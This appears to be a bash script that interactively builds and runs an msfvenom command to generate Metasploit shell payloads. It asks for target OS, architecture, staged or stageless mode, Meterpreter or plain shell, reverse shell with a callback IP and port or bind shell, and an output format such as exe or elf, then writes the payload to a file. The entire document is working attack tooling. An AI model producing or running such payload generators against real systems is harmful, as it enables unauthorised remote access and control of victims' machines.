#!/bin/bash

echo "What is the operating system of your target? Example: windows, linux, osx"
read OS


echo "Is it 64 bit or 32? Please type 32 or 64."
read architecture


no_arc_display(){
case $OS in
        windows)
                arc=""
        ;;
esac
}


meterpreter_question(){
echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
read meterpreter
}

linux_x86_meterpreter(){
case  $OS in
	linux)
		meterpreter_question
	;;
	windows)
		meterpreter_question
	;;
	osx)
		meterpreter='n'
	;;
esac
}


echo "Would you like your payload staged or stageless? Please indicate 1 for staged and 2 for stageless"
read stage


stage_symbol=""


case $stage in
	1)
		stage_symbol="/"
	;;
	2)
		stage_symbol="_"
	;;
esac


case $architecture in
	32)
		arc="/x86"
		no_arc_display
		linux_x86_meterpreter
	;;

	64)
		arc="/x64"
		meterpreter_question
	;;
esac


echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
read shell

ip_port=""
case $shell in
  reverse)
   	echo "Please enter your IP address."
        read ip
        echo "Please enter the port you would like to listen on."
        read port
	ip_port="LHOST=$ip LPORT=$port"
    ;;
  bind)
        echo "Please enter your target's IP address."
	read ip
	echo "Please enter the remote port."
	read port
	ip_port="RHOST=$ip RPORT=$port"
    ;;
esac


echo "What would you like the file format to be? Example: exe, raw, pl, rb, c, elf"
read format

payload=""
msfgen=""

echo "What would you like to name the file?"
read filename

use_meterpreter() {
	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
}


no_meterpreter() {
        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
}

case  $meterpreter  in
	y)
	payload="${OS}${arc}/meterpreter"
	use_meterpreter
	echo "You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
        ;;
	n)
	payload="${OS}${arc}/shell"
	no_meterpreter
	echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
        ;;
	*)
esac

echo "msfvenom -p $msfgen"

msfvenom -p $msfgen > ${filename}.${format}
